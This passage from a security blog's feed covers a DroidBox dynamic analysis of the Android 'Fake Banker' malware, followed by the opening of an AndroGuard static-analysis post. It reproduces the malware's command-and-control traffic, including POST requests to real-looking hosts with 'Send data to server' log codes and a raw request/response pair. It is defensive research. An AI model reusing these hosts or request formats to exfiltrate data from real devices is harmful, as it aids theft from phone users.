    <tr>
      <th>0</th>
      <td> 0:00:08</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 17</td>
      <td> send</td>
      <td> net write</td>
      <td> POST /images/1.php HTTP/1.1\r\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>
    </tr>
    <tr>
      <th>1</th>
      <td> 0:15:06</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 23</td>
      <td> send</td>
      <td> net write</td>
      <td> POST /images/1.php HTTP/1.1\r\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>
    </tr>
    <tr>
      <th>2</th>
      <td> 0:15:36</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 28</td>
      <td> send</td>
      <td> net write</td>
      <td> POST /images/1.php HTTP/1.1\r\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>
    </tr>
    <tr>
      <th>3</th>
      <td> 0:16:00</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 33</td>
      <td> send</td>
      <td> net write</td>
      <td> POST /images/1.php HTTP/1.1\r\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>
    </tr>
  </tbody>
</table>
</div>
<h3 id="received-data-recvnet">Received data (recvnet)</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Convert timestamps to human readable time delta
timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(&#34;utf-8&#34;)))))) for i in result[&#39;recvnet&#39;].keys()]

# Create list of accessed files entries
recv_net = [i[1] for i in result[&#39;recvnet&#39;].items()]

# Create dataframe
df_recvnet = pd.DataFrame(recv_net, index=timestamps)
df_recvnet.sort(inplace=True)
df_recvnet.index.name=&#39;Timestamp&#39;

# Unhexlify data
unhexed_data = [binascii.unhexlify(d) for d in df_recvnet[&#39;data&#39;]]
df_recvnet[&#39;rawdata&#39;] = unhexed_data

#df2table(df_recvnet[[&#39;host&#39;, &#39;port&#39;, &#39;type&#39;, &#39;rawdata&#39;]])
#ipy_table.apply_theme(&#39;basic&#39;)
df_recvnet[[&#39;host&#39;, &#39;port&#39;, &#39;type&#39;, &#39;rawdata&#39;]].reset_index()
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>host</th>
      <th>port</th>
      <th>type</th>
      <th>rawdata</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 0:00:08</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:29:38 GMT\r\nServer: Apache\r\nContent-...</td>
    </tr>
    <tr>
      <th>1</th>
      <td> 0:00:08</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> x=10\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n&lt;!DOCTYPE H...</td>
    </tr>
    <tr>
      <th>2</th>
      <td> 0:15:06</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> x=10\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n&lt;!DOCTYPE H...</td>
    </tr>
    <tr>
      <th>3</th>
      <td> 0:15:06</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:44:36 GMT\r\nServer: Apache\r\nContent-...</td>
    </tr>
    <tr>
      <th>4</th>
      <td> 0:15:36</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:45:06 GMT\r\nServer: Apache\r\nContent-...</td>
    </tr>
    <tr>
      <th>5</th>
      <td> 0:15:36</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> x=10\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n&lt;!DOCTYPE H...</td>
    </tr>
    <tr>
      <th>6</th>
      <td> 0:16:00</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:45:30 GMT\r\nServer: Apache\r\nContent-...</td>
    </tr>
    <tr>
      <th>7</th>
      <td> 0:16:00</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> net read</td>
      <td> x=10\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n&lt;!DOCTYPE H...</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="requests-sequence">Requests sequence</h2>
<p>Since I was not able to get the full contents of the POST/GET requests (and their equivalent responses), I had to rely on the information found <a href="http://www.apk-analyzer.net/analysis/646/3752/0/html">here</a>. Below is a short sequence diagramm describing the general process of the communication. Keep in mind that the sequence only tries to give you a short overview of the data exchange between the process and the webserver.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%%seqdiag
# &lt;!-- collapse=True --&gt;
seqdiag {
  application  -&gt; citroen-club.ch [label = &#34;POST /images/1.php HTTP/1.1&#34;];
  application &lt;-- citroen-club.ch [label = &#34;HTTP/1.1 406 Not Acceptable&#34;, leftnote= &#34;&#34;];
  application --&gt; best-invest-int.com [label = &#34;POST /gallery/3.php HTTP/1.1&#34;, note = &#34;POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;rid=25&#34;];
  application &lt;-- best-invest-int.com [label = &#34;HTTP/1.1 403 Forbidden&#34;];
  application --&gt; best-invest-int.com [label = &#34;POST /gallery/4.php HTTP/1.1&#34;, note = &#34;POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Get+config+data+from+server&#34;];
  application &lt;-- best-invest-int.com [label = &#34;HTTP/1.1 403 Forbidden&#34;];
  application --&gt; best-invest-int.com [label = &#34;POST /gallery/4.php HTTP/1.1&#34;, note = &#34;POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=DATA&amp;LogText=Send+data+to+server&amp;&#34;];
  application &lt;-- best-invest-int.com [label = &#34;...&#34;];
}

</code></pre></div><p><img src="/posts/img/2014/android-dynamic-code-analysis-mastering-droidbox/output_44_0.png" alt="png"></p>
<p>And now a complete request/response pair:</p>
<p><strong>Request</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">POST /gallery/4.php HTTP/1.1
User-agent: Mozilla/4.76 (Java; U;Linux i686 3.0.36-android-x86-eeepc+; ru; The Android Project 0)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Pragma: no-cache
Host: best-invest-int.com
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 86
Data Raw: 64 61 74 61 3d 55 32 6c 74 55 33 52 68 64 47 55 67 50 53 42 4f 54 31 51 67 55 6b 56 42 52 46 6b 67 43 67 25 33 44 25 33 44 25 30 41 26 4c 6f 67 43 6f 64 65 3d 43 4f 4e 46 26 4c 6f 67 54 65 78 74 3d 43 68 65 63 6b 2b 70 75 6c 6c 2b 6f 66 66 2b 75 72 6c 73 26 
Data Ascii: data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Check+pull+off+urls&amp;
</code></pre></div><p><strong>Response</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">HTTP/1.1 403 Forbidden
Date: Thu, 21 Nov 2013 12:37:26 GMT
Server: Apache/2.2.3 (CentOS)
Content-Length: 299
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&#39;t have permission to access /gallery/4.phpon this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.2.3 (CentOS) Server at best-invest-int.com Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre></div><h2 id="crypto-activities">Crypto activities</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Convert timestamps to human readable time delta
timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(&#34;utf-8&#34;)))))) for i in result[&#39;cryptousage&#39;].keys()]

# Create list of accessed files entries
crypto_usage = [i[1] for i in result[&#39;cryptousage&#39;].items()]

# Create dataframe
df_cryptousage = pd.DataFrame(crypto_usage, index=timestamps)
df_cryptousage.sort(inplace=True)
df_cryptousage.index.name=&#39;Timestamp&#39;

# Unhexlify data
#unhexed_data = [binascii.unhexlify(d) for d in df_recvnet[&#39;data&#39;]]
#df_recvnet[&#39;rawdata&#39;] = unhexed_data

#df_recvnet[[&#39;host&#39;, &#39;port&#39;, &#39;type&#39;, &#39;rawdata&#39;]]
df_cryptousage.reset_index()
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>algorithm</th>
      <th>key</th>
      <th>operation</th>
      <th>type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 0:00:09</td>
      <td> Blowfish</td>
      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>
      <td> keyalgo</td>
      <td> crypto</td>
    </tr>
    <tr>
      <th>1</th>
      <td> 0:15:06</td>
      <td> Blowfish</td>
      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>
      <td> keyalgo</td>
      <td> crypto</td>
    </tr>
    <tr>
      <th>2</th>
      <td> 0:15:36</td>
      <td> Blowfish</td>
      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>
      <td> keyalgo</td>
      <td> crypto</td>
    </tr>
    <tr>
      <th>3</th>
      <td> 0:16:00</td>
      <td> Blowfish</td>
      <td> 52, 101, 54, 54, 55, 54, 54, 101, 54, 98, 54, 97, 54, 99, 54, 101, 55, 54, 54, 98, 54, 97, 52, 9...</td>
      <td> keyalgo</td>
      <td> crypto</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="activities-chart">Activities chart</h2>
<p>Now let&rsquo;s have a look in which <em>order</em> the several activities took place. Below you&rsquo;ll find a table containing the timestamp, operation and category of each specific activity (e.g. file system access, network read/write etc.)</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Create df
df_activities = pd.DataFrame(columns=[[&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]])

# file system access
accessed_files = df_accessedfiles.reset_index()[[0,3]]
accessed_files[&#39;Category&#39;] = &#34;file system&#34;
accessed_files.columns = [&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]

# network activities
network_open = df_opennet.reset_index()[[0]]
network_open[&#39;Operation&#39;] = &#39;net open&#39;
network_open[&#39;Category&#39;] = &#39;network&#39;
network_open.columns = [&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]

network_sent = df_sendnet.reset_index()[[0,6]]
network_sent[&#39;Category&#39;] = &#34;network&#34;
network_sent.columns = [&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]

network_recv = df_recvnet.reset_index()[[0,4]]
network_recv[&#39;Category&#39;] = &#34;network&#34;
network_recv.columns = [&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]

# crpyto usage
crypto_usage = df_cryptousage.reset_index()[[0,1]]
crypto_usage[&#39;Category&#39;] = &#34;crypto&#34;
crypto_usage.columns = [&#39;Timestamp&#39;, &#39;Operation&#39;, &#39;Category&#39;]

# Merge data frames
df_activities = pd.concat([accessed_files, network_open, network_sent, network_recv, crypto_usage], ignore_index=True)
df_activities.sort(&#39;Timestamp&#39;, inplace=True)

# Convert to JSON
d = df_activities.to_json(orient=&#39;records&#39;)
json_data = json.dumps(json.loads(d), ensure_ascii=False).encode(&#34;utf-8&#34;)

df_activities
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>Operation</th>
      <th>Category</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 0:00:03</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 0:00:04</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> 0:00:04</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> 0:00:08</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>21</th>
      <td> 0:00:08</td>
      <td>  net open</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>25</th>
      <td> 0:00:08</td>
      <td> net write</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>29</th>
      <td> 0:00:08</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>30</th>
      <td> 0:00:08</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> 0:00:09</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>37</th>
      <td> 0:00:09</td>
      <td>  Blowfish</td>
      <td>      crypto</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> 0:00:10</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> 0:00:10</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> 0:00:36</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>8 </th>
      <td> 0:00:36</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> 0:01:05</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>10</th>
      <td> 0:15:06</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>11</th>
      <td> 0:15:06</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>22</th>
      <td> 0:15:06</td>
      <td>  net open</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>26</th>
      <td> 0:15:06</td>
      <td> net write</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>31</th>
      <td> 0:15:06</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>32</th>
      <td> 0:15:06</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>38</th>
      <td> 0:15:06</td>
      <td>  Blowfish</td>
      <td>      crypto</td>
    </tr>
    <tr>
      <th>12</th>
      <td> 0:15:24</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>13</th>
      <td> 0:15:27</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>14</th>
      <td> 0:15:35</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>23</th>
      <td> 0:15:36</td>
      <td>  net open</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>27</th>
      <td> 0:15:36</td>
      <td> net write</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>33</th>
      <td> 0:15:36</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>34</th>
      <td> 0:15:36</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>39</th>
      <td> 0:15:36</td>
      <td>  Blowfish</td>
      <td>      crypto</td>
    </tr>
    <tr>
      <th>15</th>
      <td> 0:15:37</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>16</th>
      <td> 0:15:37</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>17</th>
      <td> 0:15:58</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>18</th>
      <td> 0:16:00</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>24</th>
      <td> 0:16:00</td>
      <td>  net open</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>28</th>
      <td> 0:16:00</td>
      <td> net write</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>35</th>
      <td> 0:16:00</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>36</th>
      <td> 0:16:00</td>
      <td>  net read</td>
      <td>     network</td>
    </tr>
    <tr>
      <th>40</th>
      <td> 0:16:00</td>
      <td>  Blowfish</td>
      <td>      crypto</td>
    </tr>
    <tr>
      <th>19</th>
      <td> 0:16:01</td>
      <td>     write</td>
      <td> file system</td>
    </tr>
    <tr>
      <th>20</th>
      <td> 0:16:10</td>
      <td>      read</td>
      <td> file system</td>
    </tr>
  </tbody>
</table>
</div>
<p>A fancier overview &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%%jinja html
&lt;!-- collapse=True --&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;script src=&#34;http://d3js.org/d3.v3.min.js&#34;&gt;&lt;/script&gt;
  &lt;script src=&#34;http://dimplejs.org/dist/dimple.v2.1.0.min.js&#34;&gt;&lt;/script&gt;
&lt;title&gt;{{ title }}&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&#34;bar_chart&#34;&gt;&lt;/div&gt;
  &lt;script type=&#34;text/javascript&#34;&gt;
    var json_data  = {{ json_data }};
    var svg = dimple.newSvg(&#34;#bar_chart&#34;, 800, 800);
    var myChart = new dimple.chart(svg, json_data);
    myChart.setBounds(150, 50, 700, 680)
    myChart.addCategoryAxis(&#34;x&#34;, [&#34;Category&#34;, &#34;Operation&#34;]);
    myChart.addCategoryAxis(&#34;y&#34;, &#34;Timestamp&#34;);
    myChart.addSeries(&#34;Operation&#34;, dimple.plot.bar);
    myChart.addLegend(170, 10, 630, 20, &#34;right&#34;);
    myChart.draw();
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><!-- collapse=True -->
<html>
<head>
  <script src="http://d3js.org/d3.v3.min.js"></script>
  <script src="http://dimplejs.org/dist/dimple.v2.1.0.min.js"></script>
<title></title>
</head>
<body>
<div id="bar_chart"></div>
  <script type="text/javascript">
    var json_data  = [{"Category": "file system", "Timestamp": "0:00:03", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:00:04", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:00:04", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:00:08", "Operation": "read"}, {"Category": "network", "Timestamp": "0:00:08", "Operation": "net open"}, {"Category": "network", "Timestamp": "0:00:08", "Operation": "net write"}, {"Category": "network", "Timestamp": "0:00:08", "Operation": "net read"}, {"Category": "network", "Timestamp": "0:00:08", "Operation": "net read"}, {"Category": "file system", "Timestamp": "0:00:09", "Operation": "write"}, {"Category": "crypto", "Timestamp": "0:00:09", "Operation": "Blowfish"}, {"Category": "file system", "Timestamp": "0:00:10", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:00:10", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:00:36", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:00:36", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:01:05", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:15:06", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:15:06", "Operation": "write"}, {"Category": "network", "Timestamp": "0:15:06", "Operation": "net open"}, {"Category": "network", "Timestamp": "0:15:06", "Operation": "net write"}, {"Category": "network", "Timestamp": "0:15:06", "Operation": "net read"}, {"Category": "network", "Timestamp": "0:15:06", "Operation": "net read"}, {"Category": "crypto", "Timestamp": "0:15:06", "Operation": "Blowfish"}, {"Category": "file system", "Timestamp": "0:15:24", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:15:27", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:15:35", "Operation": "read"}, {"Category": "network", "Timestamp": "0:15:36", "Operation": "net open"}, {"Category": "network", "Timestamp": "0:15:36", "Operation": "net write"}, {"Category": "network", "Timestamp": "0:15:36", "Operation": "net read"}, {"Category": "network", "Timestamp": "0:15:36", "Operation": "net read"}, {"Category": "crypto", "Timestamp": "0:15:36", "Operation": "Blowfish"}, {"Category": "file system", "Timestamp": "0:15:37", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:15:37", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:15:58", "Operation": "read"}, {"Category": "file system", "Timestamp": "0:16:00", "Operation": "write"}, {"Category": "network", "Timestamp": "0:16:00", "Operation": "net open"}, {"Category": "network", "Timestamp": "0:16:00", "Operation": "net write"}, {"Category": "network", "Timestamp": "0:16:00", "Operation": "net read"}, {"Category": "network", "Timestamp": "0:16:00", "Operation": "net read"}, {"Category": "crypto", "Timestamp": "0:16:00", "Operation": "Blowfish"}, {"Category": "file system", "Timestamp": "0:16:01", "Operation": "write"}, {"Category": "file system", "Timestamp": "0:16:10", "Operation": "read"}];
    var svg = dimple.newSvg("#bar_chart", 800, 800);
    var myChart = new dimple.chart(svg, json_data);
    myChart.setBounds(150, 50, 700, 680)
    myChart.addCategoryAxis("x", ["Category", "Operation"]);
    myChart.addCategoryAxis("y", "Timestamp");
    myChart.addSeries("Operation", dimple.plot.bar);
    myChart.addLegend(170, 10, 630, 20, "right");
    myChart.draw();
  </script>
</body>
</html>
<p>A few <strong>observations</strong>:</p>
<ul>
<li>file system access (both read and write) are taking place all the time</li>
<li>the crypto routines are apparently involved when sending data over internet or receiving data</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>I think <code>DroidBox</code> is a very good tool to deal with Android APKs and analyze their behaviour during run-time. It comes with a working mobile sandbox meant to inspect and monitor an applications activities. However during my analysis I had to rely on previous analysis since the results didn&rsquo;t contain the full details. Not only the network traffic but also the contents read from files weren&rsquo;t complete. In order to fully unterstand one malware I need complete details about its behaviour.  For example I had following response from the server which is completely useless:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">HTTP/1.1 406 Not Acceptable\r\nDate: Mon, 28 Jul 2014 13:29:38 GMT\r\nServer: Apache\r\nContent-...
</code></pre></div><p>Besides that I was indeed able to see that the application is reading from some file. But the delivered content was once again striped:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;\n&lt;map&gt;\n&lt;string name=&#34;DOWNLOADDOMAIN&#34;&gt;c...
</code></pre></div><p>I hope the developers will see this as a vital necessity and update as soon as possible. Furthermore I&rsquo;ll look forward to other mobile sandboxes which have data instrumentation capabilities. Next time I&rsquo;ll have a deeper look at Androids <a href="http://developer.android.com/tools/debugging/ddms.html">DDMS</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Disect Android APKs like a Pro - Static code analysis</title>
      <link>https://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/</link>
      <pubDate>Mon, 07 Jul 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ve started writing this <a href="http://ipython.org/notebook.html">IPython notebook</a> in order to make myself more comfortable with Android and its SDK. Due to some personal interests I thought I could also have a look at the available <a href="http://en.wikipedia.org/wiki/Reverse_engineering">RE</a> tools and learn more about their pros &amp; cos. In particular I had a closer look at <a href="https://code.google.com/p/androguard/"><strong>AndroGuard</strong></a> which seems to be good at:</p>
<blockquote>
<p>Reverse engineering, Malware and goodware analysis of Android applications &hellip; and more (ninja !)</p>
</blockquote>
<p>I was charmed but its capabilities and the pythonic art of handling with APKs. In the 2nd step I&rsquo;ve needed a malware to play it, so I had a look at <a href="http://contagiominidump.blogspot.de/">Contagio Mobile</a>. There I&rsquo;ve randomly chosen a malware and got stucked with <a href="http://contagiominidump.blogspot.de/2014/05/android-fake-banker.html">Fake Banker</a>. There are some technical details about the malware itself gained during automated tests which can be read <a href="http://www.apk-analyzer.net/analysis/646/3752/0/html">here</a>.</p>
<p>This article will only deal with the <strong>static source code analysis</strong> of the malware. A 2nd part dedicated to the <strong>dynamic analysis</strong> is planed as well.</p>
<h3 id="start-kali-linux">Start Kali Linux</h3>
<p>Stay safe and run the stuff isolated:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">âžœ  ~  virsh -c qemu:///system           

Welcome to virsh, the virtualization interactive terminal.

Type:  <span style="color:#ed9d13">&#39;help&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#24909d">help</span> with commands
       <span style="color:#ed9d13">&#39;quit&#39;</span> to quit

virsh <span style="color:#999;font-style:italic"># </span>
virsh <span style="color:#999;font-style:italic"># list --all</span>
 Id    Name                           State
----------------------------------------------------
 <span style="color:#3677a9">2</span>     Ubuntu.GitLab                  running
 -     Linux.Kali                     shut off
 -     Ubuntu.Tracks                  shut off
 -     Windows7                       shut off

virsh <span style="color:#999;font-style:italic"># start Linux.Kali</span>
Domain Linux.Kali started

</code></pre></div><p>Now we&rsquo;re ready to login:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">âžœ  ~  ssh kali.local
victor@kali.local<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s password: 
Linux kali 3.7-trunk-amd64 <span style="color:#999;font-style:italic">#1 SMP Debian 3.7.2-0+kali8 x86_64</span>

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms <span style="color:#6ab825;font-weight:bold">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
</code></pre></div><h3 id="install-sdk">Install SDK</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(env)root@kali:~/work/apk/SDK# wget http://dl.google.com/android/android-sdk_r22.6.2-linux.tgz
(env)root@kali:~/work/apk/SDK# tar -zxf android-sdk_r22.6.2-linux.tgz
(env)root@kali:~/work/apk/SDK# <span style="color:#24909d">export</span> <span style="color:#40ffff">PATH</span>=<span style="color:#40ffff">$PATH</span>:/root/work/apk/SDK/android-sdk-linux/tools(env)root@kali:~/work/apk/SDK# which monitor
/root/work/apk/SDK/android-sdk-linux/tools/monitor
</code></pre></div><blockquote>
<p>Make sure you have the <strong>ia32-libs</strong> installed.</p>
</blockquote>
<h3 id="setup-path">Setup PATH</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import os
import sys

# Adjust PYTHONPATH
sys.path.append(os.path.expanduser(&#39;~/work/bin/androguard&#39;))

# Setup new PATH
old_path = os.environ[&#39;PATH&#39;]
new_path = old_path + &#34;:&#34; + &#34;/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0&#34;
os.environ[&#39;PATH&#39;] = new_path

# Change working directory
os.chdir(&#34;/root/work/apk/&#34;)
</code></pre></div><h3 id="setup-ipython-settings">Setup IPython settings</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%pylab inline
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import networkx as nx
from IPython.display import display_pretty, display_html, display_jpeg, display_png, display_json, display_latex, display_svg

# Androguard stuff
import androlyze as anz
